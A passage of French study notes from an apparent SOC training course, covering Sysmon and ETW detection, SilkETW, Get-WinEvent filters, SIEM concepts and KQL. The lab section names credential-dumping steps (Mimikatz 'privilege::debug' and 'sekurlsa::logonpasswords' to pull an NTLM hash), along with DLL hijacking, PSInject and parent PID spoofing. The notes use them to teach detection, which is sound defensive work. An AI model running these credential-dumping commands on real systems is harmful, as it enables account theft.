<li>quels process sont “managed (.NET)” (clr.dll / clrjit.dll chargés)</li>
<li>la liste des modules chargés par chaque process</li>
</ul></li>
<li><strong>Sysmon Event ID 7</strong> pour les chargements de DLL</li>
</ul>
<p>Scénario :</p>
<ol>
<li>On injecte une DLL de “PowerShell unmanaged” dans un process comme <strong>spoolsv.exe</strong> avec <strong>PSInject</strong>.</li>
<li>Avant injection : spoolsv.exe = process natif, pas de clr.dll.</li>
<li>Après injection :
<ul>
<li>spoolsv.exe apparaît comme <strong>Process managed (.NET)</strong></li>
<li>Sysmon ID 7 montre le chargement de <code>clr.dll</code> / <code>clrjit.dll</code> dans spoolsv.exe</li>
</ul></li>
</ol>
<p><strong>IOC</strong> : chargement de DLLs .NET (clr, clrjit) dans des process qui n’utilisent <strong>normalement pas</strong> .NET.</p>
<h3>Détection 3 : Credential dumping (Mimikatz / LSASS)</h3>
<p>Attaque : <strong>Mimikatz</strong> avec <code>sekurlsa::logonpasswords</code> pour lire les credentials en mémoire dans <strong>LSASS</strong>.</p>
<p>Détection avec Sysmon :</p>
<ul>
<li><strong>Event ID 10 – ProcessAccess</strong>
<ul>
<li><code>TargetImage</code> = <code>lsass.exe</code></li>
<li><code>SourceImage</code> = binaire suspect (mimikatz.exe ou loader custom)</li>
<li><code>SourceUser</code> ≠ <code>TargetUser</code> (ex : waldo → SYSTEM)</li>
<li>en amont : demande de <strong>SeDebugPrivilege</strong></li>
</ul></li>
</ul>
<p><strong>Idée</strong> : surveiller toute tentative d’accès à LSASS en dehors des outils légitimes (AV/EDR, composants système).</p>
<h2>Event Tracing for Windows (ETW)</h2>
<h3>Définition &amp; architecture</h3>
<p><strong>ETW</strong> = infrastructure de traçage haute performance intégrée à Windows.</p>
<p>Architecture en modèle <em>pub/sub</em> :</p>
<ul>
<li><strong>Providers</strong> : composants qui émettent des évènements</li>
<li><strong>Sessions</strong> : collectent les évènements de certains providers</li>
<li><strong>Controllers</strong> : créent / démarrent / stoppent les sessions (ex. <code>logman.exe</code>)</li>
<li><strong>Consumers</strong> : lisent les events (Event Log, outils, scripts…)</li>
<li><strong>ETL files</strong> : logs binaires persistants sur disque</li>
<li><strong>Channels</strong> : organisent les events (administrative, operational, analytical…)</li>
</ul>
<p>Types de providers :</p>
<ul>
<li><strong>MOF</strong>, <strong>WPP</strong>, <strong>Manifest-based</strong>, <strong>TraceLogging</strong></li>
</ul>
<h3>logman &amp; autres outils</h3>
<ul>
<li><code>logman query -ets</code> : liste les <strong>sessions ETW actives</strong> (dont Sysmon)</li>
<li><code>logman query "EventLog-System" -ets</code> : détails d’une session
<ul>
<li>providers, keywords, niveau (Error, Info…), log file, etc.</li>
</ul></li>
<li><code>logman query providers</code> : liste tous les providers disponibles (il y en a <strong>&gt;1000</strong> sous Windows 10)</li>
</ul>
<p>Autres outils GUI :</p>
<ul>
<li><strong>Performance Monitor</strong> → “Event Trace Sessions”</li>
<li><strong>EtwExplorer</strong> (projet externe) pour explorer la métadonnée des providers (keywords, events, etc.)</li>
</ul>
<h3>Providers utiles &amp; providers restreints</h3>
<p>Exemples intéressants :</p>
<ul>
<li><code>Microsoft-Windows-Kernel-Process</code> / <code>File</code> / <code>Network</code> / <code>Registry</code></li>
<li><code>Microsoft-Windows-SMBClient/SMBServer</code></li>
<li><code>Microsoft-Windows-DotNETRuntime</code></li>
<li><code>Microsoft-Windows-PowerShell</code></li>
<li><code>Microsoft-Windows-TerminalServices-LocalSessionManager</code></li>
<li><code>Microsoft-Windows-DNS-Client</code></li>
<li>providers AV / antimalware</li>
</ul>
<p><strong>Providers restreints</strong> :</p>
<ul>
<li><p>ex. <code>Microsoft-Windows-Threat-Intelligence</code></p>
<p>→ accessible seulement à des processus protégés par <strong>PPL (Protected Process Light)</strong> (typiquement les AV approuvés par Microsoft).</p></li>
</ul>
<h2>Tapping Into ETW : détections avancées</h2>
<h3>Détection 1 : parent-child relationships anormales</h3>
<p>But : repérer des <strong>relations parent/enfant impossibles</strong> (ex. spoolsv.exe → cmd.exe).</p>
<p>Problème :</p>
<ul>
<li>Des techniques (ex. <strong>Parent PID Spoofing</strong>) permettent de tromper Sysmon (ID 1) sur le parent affiché.</li>
</ul>
<p>Solution :</p>
<ul>
<li>Utiliser ETW avec le provider <strong>Microsoft-Windows-Kernel-Process</strong>, capturé via <strong>SilkETW</strong>.</li>
</ul>
<p>Exemple :</p>
<ol>
<li>On spoofe le parent de <code>cmd.exe</code> pour qu’il semble lancé par <code>spoolsv.exe</code>.</li>
<li>Sysmon ID 1 affiche spoolsv.exe comme parent.</li>
<li><p>En parallèle, on lance SilkETW :</p>
<div class="codehilite">
<pre><span></span><code>SilkETW.exe<span class="w"> </span>-t<span class="w"> </span>user<span class="w"> </span>-pn<span class="w"> </span>Microsoft-Windows-Kernel-Process<span class="w"> </span>-ot<span class="w"> </span>file<span class="w"> </span>-p<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\e</span>tw.json
</code></pre>
</div></li>
<li><p>En analysant <code>etw.json</code>, on trouve que le vrai parent est <code>powershell.exe</code>.</p></li>
</ol>
<p>Conclusion : <strong>Sysmon peut être trompé</strong>, ETW “kernel process” donne une vérité plus proche de la réalité → intérêt pour la chasse avancée.</p>
<h3>Détection 2 : chargement de .NET assemblies malveillantes (BYOL)</h3>
<p>Concept <strong>Bring Your Own Land (BYOL)</strong> :</p>
<ul>
<li>au lieu de “Living off the Land” (LOLBins), l’attaquant apporte ses propres outils .NET compilés (assemblies), exécutés directement en mémoire (ex. <code>Seatbelt.exe</code>).</li>
</ul>
<p>Détection en 2 niveaux :</p>
<ol>
<li><strong>Sysmon Event ID 7</strong> :
<ul>
<li><code>Image</code> = <code>Seatbelt.exe</code></li>
<li><code>ImageLoaded</code> = <code>clr.dll</code>, <code>mscoree.dll</code></li>
<li>→ confirme un binaire .NET</li>
</ul></li>
<li><p><strong>ETW – Microsoft-Windows-DotNETRuntime</strong> via SilkETW :</p>
<div class="codehilite">
<pre><span></span><code>SilkETW.exe<span class="w"> </span>-t<span class="w"> </span>user<span class="w"> </span>-pn<span class="w"> </span>Microsoft-Windows-DotNETRuntime<span class="w"> </span>-uk<span class="w"> </span>0x2038<span class="w"> </span>-ot<span class="w"> </span>file<span class="w"> </span>-p<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\e</span>tw.json
</code></pre>
</div>
<ul>
<li><code>uk 0x2038</code> = sélectionne certains <strong>keywords</strong> (JIT, Loader, Interop, NGen)</li>
<li><code>etw.json</code> contient des détails sur :
<ul>
<li>les méthodes JIT-compilées</li>
<li>les assemblies chargées</li>
<li>les méthodes d’interop (ManagedInteropMethodName, etc.)</li>
</ul></li>
</ul></li>
</ol>
<p>→ On obtient une <strong>vue très fine</strong> de ce que fait l’assembly .NET (ex. des méthodes de Seatbelt).</p>
<h2>Get-WinEvent : analyse massive de logs</h2>
<h3>Pourquoi Get-WinEvent ?</h3>
<p>Les environnements réels produisent <strong>des millions de logs / jour</strong>.</p>
<p>On ne peut pas tout lire à la main dans Event Viewer.</p>
<p><strong>Get-WinEvent</strong> permet :</p>
<ul>
<li>d’énumérer les logs disponibles</li>
<li>de lire à la fois :
<ul>
<li>logs classiques (System, Security, Application…)</li>
<li>ETW logs (ex. <code>Microsoft-Windows-WinRM/Operational</code>)</li>
<li>fichiers <strong>.evtx</strong> ou <strong>.etl</strong> exportés</li>
</ul></li>
<li>d’appliquer des <strong>filtres puissants</strong> :
<ul>
<li>FilterHashtable</li>
<li>FilterXml</li>
<li>FilterXPath</li>
</ul></li>
<li>de parser l’XML, enrichir, corréler, etc.</li>
</ul>
<h3>Lister logs &amp; providers</h3>
<ul>
<li><p>Lister tous les logs :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-ListLog</span> <span class="p">*</span> <span class="p">|</span>
  <span class="nb">Select-Object</span> <span class="n">LogName</span><span class="p">,</span> <span class="n">RecordCount</span><span class="p">,</span> <span class="n">IsClassicLog</span><span class="p">,</span> <span class="n">IsEnabled</span><span class="p">,</span> <span class="n">LogMode</span><span class="p">,</span> <span class="n">LogType</span> <span class="p">|</span>
  <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
</code></pre>
</div></li>
<li><p>Lister les providers et les logs associés :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-ListProvider</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
</code></pre>
</div></li>
</ul>
<h3>Lire des logs</h3>
<ul>
<li><p>Derniers events du log System :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="s1">'System'</span> <span class="n">-MaxEvents</span> <span class="n">50</span> <span class="p">|</span>
  <span class="nb">Select-Object</span> <span class="n">TimeCreated</span><span class="p">,</span> <span class="n">Id</span><span class="p">,</span> <span class="n">ProviderName</span><span class="p">,</span> <span class="n">LevelDisplayName</span><span class="p">,</span> <span class="n">Message</span> <span class="p">|</span>
  <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
</code></pre>
</div></li>
<li><p>Plus anciens events d’un log :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="s1">'Microsoft-Windows-WinRM/Operational'</span> <span class="n">-Oldest</span> <span class="n">-MaxEvents</span> <span class="n">30</span> <span class="p">|</span>
  <span class="nb">Select-Object</span> <span class="n">TimeCreated</span><span class="p">,</span> <span class="n">Id</span><span class="p">,</span> <span class="n">ProviderName</span><span class="p">,</span> <span class="n">LevelDisplayName</span><span class="p">,</span> <span class="n">Message</span> <span class="p">|</span>
  <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
</code></pre>
</div></li>
<li><p>Lire un fichier <code>.evtx</code> :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-Path</span> <span class="s1">'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\exec_sysmon_1_lolbin_pcalua.evtx'</span> <span class="n">-MaxEvents</span> <span class="n">5</span> <span class="p">|</span>
  <span class="nb">Select-Object</span> <span class="n">TimeCreated</span><span class="p">,</span> <span class="n">Id</span><span class="p">,</span> <span class="n">ProviderName</span><span class="p">,</span> <span class="n">LevelDisplayName</span><span class="p">,</span> <span class="n">Message</span> <span class="p">|</span>
  <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
</code></pre>
</div></li>
</ul>
<h3>FilterHashtable</h3>
<p>Filtrer par log, ID, dates, etc. :</p>
<div class="codehilite">
<pre><span></span><code><span class="c"># Sysmon ID 1 &amp; 3</span>
<span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span>
  <span class="n">LogName</span> <span class="p">=</span> <span class="s1">'Microsoft-Windows-Sysmon/Operational'</span>
  <span class="n">Id</span>      <span class="p">=</span> <span class="n">1</span><span class="p">,</span><span class="n">3</span>
<span class="p">}</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">TimeCreated</span><span class="p">,</span> <span class="n">Id</span><span class="p">,</span> <span class="n">ProviderName</span><span class="p">,</span> <span class="n">Message</span>
</code></pre>
</div>
<p>Avec plage de dates :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">$startDate</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Date</span> <span class="n">-Year</span> <span class="n">2023</span> <span class="n">-Month</span> <span class="n">5</span> <span class="n">-Day</span> <span class="n">28</span><span class="p">).</span><span class="n">Date</span>
<span class="nv">$endDate</span>   <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Date</span> <span class="n">-Year</span> <span class="n">2023</span> <span class="n">-Month</span> <span class="n">6</span> <span class="n">-Day</span> <span class="n">3</span><span class="p">).</span><span class="n">Date</span>

<span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span>
  <span class="n">LogName</span>   <span class="p">=</span> <span class="s1">'Microsoft-Windows-Sysmon/Operational'</span>
  <span class="n">Id</span>        <span class="p">=</span> <span class="n">1</span><span class="p">,</span><span class="n">3</span>
  <span class="n">StartTime</span> <span class="p">=</span> <span class="nv">$startDate</span>
  <span class="n">EndTime</span>   <span class="p">=</span> <span class="nv">$endDate</span>
<span class="p">}</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">TimeCreated</span><span class="p">,</span> <span class="n">Id</span><span class="p">,</span> <span class="n">ProviderName</span><span class="p">,</span> <span class="n">Message</span>
</code></pre>
</div>
<p>Filtrer un fichier <code>evtx</code> avec FilterHashtable :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span>
  <span class="n">Path</span> <span class="p">=</span> <span class="s1">'C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Execution\sysmon_mshta_sharpshooter_stageless_meterpreter.evtx'</span>
  <span class="n">Id</span>   <span class="p">=</span> <span class="n">1</span><span class="p">,</span><span class="n">3</span>
<span class="p">}</span>
</code></pre>
</div>
<h3>FilterXml</h3>
<p>Utiliser une requête XML (comme dans Event Viewer) :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">$Query</span> <span class="p">=</span> <span class="sh">@"</span>
<span class="sh">&lt;QueryList&gt;</span>
<span class="sh">  &lt;Query Id="0"&gt;</span>
<span class="sh">    &lt;Select Path="Microsoft-Windows-Sysmon/Operational"&gt;</span>
<span class="sh">      *[System[(EventID=7)]] and</span>
<span class="sh">      (*[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']])</span>
<span class="sh">    &lt;/Select&gt;</span>
<span class="sh">  &lt;/Query&gt;</span>
<span class="sh">&lt;/QueryList&gt;</span>
<span class="sh">"@</span>

<span class="nb">Get-WinEvent</span> <span class="n">-FilterXml</span> <span class="nv">$Query</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span>
  <span class="nb">Write-Host</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Message</span> <span class="s2">"</span><span class="se">`n</span><span class="s2">"</span>
<span class="p">}</span>
</code></pre>
</div>
<p>→ Permet par exemple de repérer les chargements de <code>mscoree.dll</code> / <code>clr.dll</code> (assemblies .NET).</p>
<h3>FilterXPath</h3>
<p>Exemple : détecter installation d’outils Sysinternals (EULA acceptée via <code>reg.exe</code>) :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="s1">'Microsoft-Windows-Sysmon/Operational'</span> <span class="p">`</span>
  <span class="n">-FilterXPath</span> <span class="s2">"*[EventData[Data[@Name='Image']='C:\Windows\System32\reg.exe']] and</span>
<span class="s2">                *[EventData[Data[@Name='CommandLine']=</span>
<span class="s2">                  '</span><span class="se">`"</span><span class="s2">C:\Windows\system32\reg.exe</span><span class="se">`"</span><span class="s2"> ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]"</span> <span class="p">|</span>
  <span class="nb">Select </span><span class="n">TimeCreated</span><span class="p">,</span> <span class="n">Id</span><span class="p">,</span> <span class="n">ProviderName</span><span class="p">,</span> <span class="n">LevelDisplayName</span><span class="p">,</span> <span class="n">Message</span>
</code></pre>
</div>
<p>Exemple réseau : Sysmon ID 3 vers IP suspecte :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="s1">'Microsoft-Windows-Sysmon/Operational'</span> <span class="p">`</span>
  <span class="n">-FilterXPath</span> <span class="s2">"*[System[EventID=3] and</span>
<span class="s2">                 EventData[Data[@Name='DestinationIp']='52.113.194.132']]"</span>
</code></pre>
</div>
<h3>Manipuler toutes les propriétés</h3>
<p>Obtenir toutes les propriétés d’un évènement :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span>
  <span class="n">LogName</span> <span class="p">=</span> <span class="s1">'Microsoft-Windows-Sysmon/Operational'</span>
  <span class="n">Id</span>      <span class="p">=</span> <span class="n">1</span>
<span class="p">}</span> <span class="n">-MaxEvents</span> <span class="n">1</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-Property</span> <span class="p">*</span>
</code></pre>
</div>
<p>Filtrer sur un champ spécifique (ex. parent command line contenant <code>-enc</code>) :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span>
  <span class="n">LogName</span> <span class="p">=</span> <span class="s1">'Microsoft-Windows-Sysmon/Operational'</span>
  <span class="n">Id</span>      <span class="p">=</span> <span class="n">1</span>
<span class="p">}</span> <span class="p">|</span>
<span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="n">21</span><span class="p">].</span><span class="n">Value</span> <span class="o">-like</span> <span class="s2">"*-enc*"</span> <span class="p">}</span> <span class="p">|</span>
<span class="nb">Format-List</span>
</code></pre>
</div>
<p>→ <code>Properties[21]</code> correspond ici à <code>ParentCommandLine</code> pour Sysmon ID 1.</p>
<h2>Exercices pratiques : stratégie générale (sans les réponses)</h2>
<p>Le module propose plusieurs labs RDP sur une VM Windows. Méthodo générale :</p>
<h3>Windows Event Logs (Security / XML Query)</h3>
<ol>
<li>Se connecter en RDP (<code>xfreerdp</code> avec les creds fournis).</li>
<li>Ouvrir <strong>Event Viewer</strong> → Windows Logs → Security.</li>
<li>Filtrer par <strong>Event ID 4624</strong> et par date/heure demandée.</li>
<li>Récupérer le <strong>Logon ID</strong> dans le détail.</li>
<li><p>Construire une <strong>XML query</strong> qui filtre les évènements de type 4907 / autres avec ce Logon ID</p>
<p>(filter SubjectLogonId + éventuellement ObjectName pour un chemin précis).</p></li>
<li><p>Dans l’event trouvé, noter :</p>
<ul>
<li>ProcessName (exécutable responsable de la modification d’audit)</li>
<li>Heure de l’évènement au format demandé (HH:MM:SS).</li>
</ul></li>
</ol>
<h3>Sysmon – DLL hijack / Unmanaged PS / Credential Dumping</h3>
<p>Sur la VM :</p>
<ul>
<li>Configurer Sysmon avec la config fournie (<code>sysmon.exe -i ...</code>, puis <code>sysmon.exe -c config.xml</code>).</li>
<li>Rejouer les attaques décrites (DLL hijack, PSInject, Mimikatz).</li>
</ul>
<p>Exemples d’actions utiles :</p>
<ul>
<li>DLL hijack :
<ul>
<li>Trouver <code>WININET.dll</code> malveillante → <code>Get-FileHash -Algorithm SHA256</code></li>
</ul></li>
<li>Unmanaged PowerShell :
<ul>
<li>Après injection dans spoolsv.exe, repérer dans Sysmon ID 7 le chemin de <code>clrjit.dll</code></li>
<li>Hasher le fichier : <code>Get-FileHash "C:\Windows\...\clrjit.dll" -Algorithm SHA256</code></li>
</ul></li>
<li>Credential dumping :
<ul>
<li>Lancer mimikatz, <code>privilege::debug</code> puis <code>sekurlsa::logonpasswords</code></li>
<li>Récupérer le hash <strong>NTLM</strong> du compte Administrator demandé.</li>
</ul></li>
</ul>
<h3>ETW + Seatbelt + SilkETW</h3>
<ol>
<li>Lancer SilkETW sur <code>Microsoft-Windows-DotNETRuntime</code> avec les bons keywords.</li>
<li>Exécuter <code>Seatbelt.exe TokenPrivileges</code>.</li>
<li>Ouvrir <code>etw.json</code> et chercher <code>ManagedInteropMethodName</code>.</li>
<li>Repérer la valeur qui commence par <strong>G</strong> et finit par <strong>ion</strong>, la donner comme réponse.</li>
</ol>
<h3>Get-WinEvent + fichiers EVTX (Lateral Movement)</h3>
<ol>
<li><p>Utiliser PowerShell pour lire tous les <code>.evtx</code> d’un dossier :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-ChildItem</span> <span class="s2">"C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Lateral Movement"</span> <span class="n">-Filter</span> <span class="p">*.</span><span class="n">evtx</span> <span class="p">|</span>
<span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span>
  <span class="nb">Get-WinEvent</span> <span class="n">-Path</span> <span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span>
<span class="p">}</span>
</code></pre>
</div></li>
<li><p>Ajouter un filtre pour les events liés aux partages (<code>5142</code> ou similaire selon les fichiers), et chercher <code>\\*\PRINT</code> dans le message.</p></li>
<li>Récupérer l’heure de l’event (<code>TimeCreated</code>) → format HH:MM:SS.</li>
</ol>
<p><figure class="image"><a href="../static/image/cjca/image34.png"><img alt="" src="../static/image/cjca/image34.png"/></a></figure></p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Security Monitoring &amp; SIEM Fundamentals</strong></summary><div class="indented"><h2>Contexte &amp; objectifs du module</h2>
<p>Ce module pose les bases du travail en <strong>SOC</strong> autour de trois axes principaux :</p>
<ul>
<li>Comprendre ce qu’est un <strong>SIEM</strong> et son rôle dans la détection d’incidents.</li>
<li>Savoir utiliser l’<strong>Elastic Stack</strong> (Elasticsearch, Logstash, Kibana, Beats) comme SIEM.</li>
<li>Construire des <strong>use cases de détection</strong>, des <strong>visualisations Kibana</strong> et maîtriser le <strong>triage des alertes</strong>.</li>
</ul>
<p>C’est un module très “opérationnel SOC” : beaucoup de théorie (SIEM, SOC, MITRE ATT&amp;CK) mais aussi de la pratique (KQL, dashboards, tableaux de failed logon, etc.).</p>
<h2>SIEM – Définition, fonctionnement, bénéfices</h2>
<p><figure class="image"><a href="../static/image/cjca/visualization16.png"><img alt="" src="../static/image/cjca/visualization16.png"/></a></figure></p>
<h3>Qu’est-ce qu’un SIEM ?</h3>
<p><strong>SIEM</strong> = <em>Security Information and Event Management</em>.
C’est une solution qui :</p>
<ul>
<li><strong>Collecte</strong> des logs et événements de sécurité (firewalls, serveurs, OS, applications…).</li>
<li><strong>Normalise et corrèle</strong> ces événements dans un format commun.</li>
<li><strong>Déclenche des alertes</strong> selon des règles (use cases).</li>
<li>Permet <strong>visualisation, reporting, incident handling</strong>.</li>
</ul>
<p>Le SIEM est au centre du SOC : c’est l’outil qui donne une <strong>vision centralisée</strong> de la posture de sécurité.</p>
<h3>Évolution SIM / SEM → SIEM</h3>
<p>À l’origine, on avait deux briques séparées :</p>
<ul>
<li><strong>SIM (Security Information Management)</strong>
<ul>
<li>Stockage long terme des logs</li>
<li>Reporting, analyse historique, corrélation avec de la threat intel</li>
</ul></li>
<li><strong>SEM (Security Event Management)</strong>
<ul>
<li>Temps réel, corrélation d’événements</li>
<li>Alertes, notifications, console temps réel</li>
</ul></li>
</ul>
<p>Le <strong>SIEM</strong> moderne fusionne ces deux approches : stockage + temps réel, avec corrélation avancée, dashboards, incident handling, etc.</p>
<h3>Comment fonctionne un SIEM ?</h3>
<ol>
<li><strong>Ingestion des données</strong> :
<ul>
<li>PC, serveurs, équipements réseau, appliances sécurité, etc.</li>
<li>Protocoles : syslog, agents, API, collectors, etc.</li>
</ul></li>
<li><strong>Normalisation &amp; agrégation</strong> :
<ul>
<li>Conversion des logs bruts vers un format commun (champs standardisés).</li>
<li>Agrégation pour éviter les doublons ou réduire le bruit.</li>
</ul></li>
<li><strong>Corrélation &amp; règles</strong> :
<ul>
<li>Détection de patterns (ex : 10 échecs de login en 4 minutes).</li>
<li>Mise en place de <strong>use cases</strong> avec seuils, agrégations, priorités.</li>
</ul></li>
<li><strong>Alerting</strong> :
<ul>
<li>Envoi aux équipes SOC via : console, email, SMS, etc.</li>
<li>Objectif : signaler les événements à <strong>fort risque</strong>, pas tout le bruit.</li>
</ul></li>
<li><strong>Reporting &amp; compliance</strong> :
<ul>
<li>Génération de rapports pour <strong>PCI DSS, HIPAA, GDPR, ISO</strong>, etc.</li>
<li>Preuve que les systèmes sont <strong>journalisés, monitorés et revus</strong>.</li>
</ul></li>
</ol>
<h3>Pourquoi un SIEM est indispensable ?</h3>
<p>Sans SIEM :</p>
<ul>
<li>Logs dispersés, non corrélés → forte chance de <strong>rater un incident grave</strong>.</li>
<li>Aucun “tableau de bord” global → vue fragmentée de la sécurité.</li>
<li>Beaucoup d’investigations manuelles, lourdes.</li>
</ul>
<p>Avec un SIEM bien tuné :</p>
<ul>
<li>Capacité à voir des patterns (ex : un firewall + proxy + AD qui parlent tous du même host).</li>
<li>Détection de comportements suspects :
<ul>
<li>Ex : 5 tentatives ratées sur un firewall qui lockent un compte admin.</li>
<li>Ex : un poste qui se connecte 100 fois par heure à un domaine malveillant.</li>
</ul></li>
<li>Réduction du coût d’un incident (détection plus rapide → impact limité).</li>
<li>Respect des <strong>obligations réglementaires</strong> (banque, santé, finance…).</li>
</ul>
<h2>Elastic Stack comme SIEM</h2>
<p><figure class="image"><a href="../static/image/cjca/elastic.png"><img alt="" src="../static/image/cjca/elastic.png"/></a></figure></p>
<h3>Composants de l’Elastic Stack</h3>
<ul>
<li><strong>Elasticsearch</strong>
<ul>
<li>Moteur de recherche distribué, REST, JSON.</li>
<li>Indexation, stockage, requêtes, agrégations.</li>
</ul></li>
<li><strong>Logstash</strong>
<ul>
<li>Pipeline de traitement de logs.</li>
<li><strong>Input → Filter → Output</strong></li>
<li>Collecte (fichiers, TCP, syslog…), transformation (parse, enrichissement), envoi vers Elasticsearch.</li>
</ul></li>
<li><strong>Kibana</strong>
<ul>
<li>Interface de visualisation : dashboards, graphiques, tableaux.</li>
<li>Requêtes, exploration de données, outils de détection.</li>
</ul></li>
<li><strong>Beats</strong> (Filebeat, Metricbeat, Winlogbeat, etc.)
<ul>
<li>“Mini-agents” mono-fonction : collectent logs/metrics sur les machines.</li>
<li>Envoient vers Logstash ou Elasticsearch.</li>
</ul></li>
</ul>
<p>Architecture typique SIEM avec Elastic :</p>
<ul>
<li><strong>Beats → Logstash → Elasticsearch → Kibana</strong>
(avec parfois Kafka/Redis/nginx pour la résilience et la sécurité).</li>
</ul>
<h3>KQL (Kibana Query Language)</h3>
<p><strong>KQL</strong> est le langage de requête de Kibana : plus simple que le Query DSL d’Elasticsearch.</p>
<h3>Exemples de base</h3>
<ul>
<li>Filtrer un event Windows d’échec de logon :</li>
</ul>
<div class="codehilite"><pre><code>event.code:4625

</code></pre></div>
<ul>
<li>Ajouter une condition sur la SubStatus (compte désactivé) :</li>
</ul>
<div class="codehilite"><pre><code>event.code:4625 AND winlog.event_data.SubStatus:0xC0000072

</code></pre></div>
<ul>
<li>Filtrer par plage temporelle :</li>
</ul>
<div class="codehilite"><pre><code>event.code:4625 AND winlog.event_data.SubStatus:0xC0000072
AND @timestamp &gt;= "2023-03-03T00:00:00.000Z"
AND @timestamp &lt;= "2023-03-06T23:59:59.999Z"

</code></pre></div>
<ul>
<li>Recherche texte libre :</li>
</ul>
<div class="codehilite"><pre><code>"svc-sql1"

</code></pre></div>
<ul>
<li>Wildcards :</li>
</ul>
<div class="codehilite"><pre><code>event.code:4625 AND user.name: admin*

</code></pre></div>
<h3>Découvrir les champs disponibles</h3>
<p>Méthode proposée :</p>
<ol>
<li>Dans <strong>Discover</strong>, faire une recherche (ex : <code>4625</code>).</li>
<li>Regarder les champs présents dans les documents :
<ul>
<li><code>event.code</code>, <code>winlog.event_id</code>, <code>winlog.event_data.SubStatus</code>, etc.</li>
</ul></li>
<li>Utiliser aussi la recherche de champs dans Kibana (barre de recherche des field names).</li>
<li>Compléter avec la documentation :
<ul>
<li>ECS (Elastic Common Schema)</li>
<li>Winlogbeat fields, Filebeat fields, etc.</li>
</ul></li>
</ol>
<h3>Elastic Common Schema (ECS)</h3>
<p>ECS = vocabulaire partagé pour tous les événements/logs dans Elastic.</p>
<p>Avantages :</p>
<ul>
<li><strong>Noms de champs cohérents</strong> entre sources (Windows, réseau, endpoints, cloud).</li>
<li>Requêtes KQL réutilisables partout (moins de “si c’est Winlogbeat alors champ X…”).</li>
<li>Corrélation facilitée (search sur <code>source.ip</code>, <code>destination.ip</code>, <code>event.action</code>, etc.).</li>
<li>Dashboards plus simples à construire et réutiliser.</li>
<li>Compatibilité avec les features avancées : Elastic Security, ML, Observability.</li>
</ul>
<h2>SOC – Définitions, rôles &amp; maturité</h2>
<p><figure class="image"><a href="../static/image/cjca/usecase1.png"><img alt="" src="../static/image/cjca/usecase1.png"/></a></figure></p>
<h3>Qu’est-ce qu’un SOC ?</h3>
<p>Un <strong>Security Operations Center</strong> est une équipe (et souvent un lieu) dédiée à :</p>
<ul>
<li><strong>Surveiller en continu</strong> la sécurité de l’organisation.</li>
<li><strong>Détecter, analyser, répondre</strong> aux incidents.</li>
<li>Utiliser des outils type <strong>SIEM, IDS/IPS, EDR</strong>, threat intel, etc.</li>
<li>Travailler avec les équipes <strong>Incident Response</strong> pour contenir/remédier.</li>
</ul>
<p>Le SOC se concentre sur <strong>l’opérationnel</strong> (run), pas sur la conception d’architecture ou l’implémentation initiale des solutions.</p>
<h3>Rôles principaux dans un SOC</h3>
<ul>
<li><strong>SOC Director</strong> : stratégie, budget, vision, alignement business.</li>
<li><strong>SOC Manager</strong> : opérations quotidiennes, planning, coordination des incidents.</li>
<li><strong>Tier 1 Analyst</strong> :
<ul>
<li>“First responder”</li>
<li>Surveille le SIEM, qualifie les alertes, fait le triage, escalade si nécessaire.</li>
</ul></li>
<li><strong>Tier 2 Analyst</strong> :
<ul>
<li>Analyse plus profonde, pattern detection, tuning des règles pour réduire les faux positifs.</li>
</ul></li>
<li><strong>Tier 3 Analyst</strong> :
<ul>
<li>Cas les plus complexes, threat hunting, techniques avancées.</li>
</ul></li>
<li><strong>Detection Engineer</strong> :
<ul>
<li>Écrit et maintient les règles de détection SIEM / IDS / EDR.</li>
<li>Comble les trous de couverture.</li>
</ul></li>
<li><strong>Incident Responder</strong> :
<ul>
